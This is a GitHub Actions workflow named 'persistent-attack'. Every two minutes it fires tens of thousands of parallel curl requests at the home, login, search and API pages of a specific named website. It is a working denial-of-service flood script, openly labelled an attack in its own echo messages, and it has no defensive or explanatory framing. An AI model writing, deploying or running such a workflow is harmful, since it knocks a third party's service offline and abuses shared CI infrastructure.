name: persistent-attack

on:
  schedule:
    - cron: '*/2 * * * *'
  workflow_dispatch:

jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - name: Install curl
        run: sudo apt-get update && sudo apt-get install -y curl

      - name: Launch attack
        run: |
          echo "🚀 Starting heavy attack on https://mohamed-shaheen.axnos.com/"
          for i in {1..10000}; do
            curl -s -o /dev/null "https://mohamed-shaheen.axnos.com/home" || true &
            curl -s -o /dev/null "https://mohamed-shaheen.axnos.com/login" || true &
            curl -s -o /dev/null "https://mohamed-shaheen.axnos.com/search?q=test" || true &
            curl -s -o /dev/null "https://mohamed-shaheen.axnos.com/api/v1/" || true &
          done
          wait
          echo "✅ Heavy attack wave completed."
